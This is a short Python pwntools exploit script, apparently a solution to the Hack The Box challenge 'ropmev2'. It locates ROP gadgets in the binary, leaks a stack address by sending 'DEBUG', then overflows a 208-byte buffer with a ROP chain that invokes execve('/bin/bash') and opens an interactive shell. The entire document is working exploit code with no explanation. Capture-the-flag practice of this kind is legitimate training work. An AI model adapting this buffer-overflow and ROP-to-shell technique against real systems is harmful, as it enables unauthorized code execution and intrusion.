#! /usr/bin/python
from pwn import *
from time import sleep
import sys
context(terminal=['tmux','new-window'])
#p = remote('docker.hackthebox.eu',32312)
p = process('./ropmev2')

#p = gdb.debug('./ropmev2','b *0x401162')
binary = ELF('./ropmev2')
rop = ROP(binary)
context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'

null = p64(0)
syscall = rop.find_gadget(['syscall'])[0]
execve = p64(59)
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax','ret']))[0]
pop_rsi = (rop.find_gadget(['pop rsi']))[0]
pop_rdx = (rop.find_gadget(['pop rdx']))[0]

log.info("pop_rdi: " + hex(pop_rdi))
log.info("pop_rax: " + hex(pop_rax))
log.info("pop_rsi: "+hex(pop_rsi))
log.info("pop_rdx: "+hex(pop_rdx))
log.info("sys_call: "+hex(syscall))

#geting stack base vaule
p.recvline('hack me')
p.sendline("DEBUG")

#reciving stack base value
binsh_p = p.recvline()[-13:].rstrip(b"\n")
binsh_p = int(binsh_p, 16)
print(hex(binsh_p))
p.recvline('hack me')
p.sendline(("A" * 208).encode()+null+p64(pop_rax)+ execve +p64(pop_rdi)+p64(binsh_p+80)+p64(pop_rsi)+null+null+p64(pop_rdx)+null+null+p64(syscall)+"/bin/bash".encode()+null) 
p.interactive()
